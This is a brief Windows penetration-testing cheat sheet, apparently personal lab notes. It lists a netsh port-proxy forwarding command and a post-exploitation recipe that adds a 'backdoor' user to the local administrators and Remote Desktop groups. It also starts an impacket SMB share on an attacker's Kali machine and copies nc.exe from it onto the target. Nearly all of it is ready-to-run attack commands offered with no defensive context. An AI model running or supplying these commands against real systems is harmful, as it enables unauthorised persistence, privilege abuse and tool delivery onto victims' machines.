# Windows

### Windows Version Information

[https://en.wikipedia.org/wiki/Comparison\_of\_Microsoft\_Windows\_versions](https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions)

## Windows Enumeration

#### Port forwarding

```bash
netsh interface portproxy add v4tov4 listenaddress=10.11.1.73 listenport=8443 connectaddress=127.0.0.1 connectport=8443
```

## Windows Post Exploitation

### Create Backdoor User <a id="backdoor_user"></a>

```text
net user backdoor backdoor123 /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

### Spin up SMB Share on Kali

`impacket-smbserver SMBSHARE ./`

#### Connect to share from windows

```bash
copy \\10.11.0.53\SMBSHARE\nc.exe
```







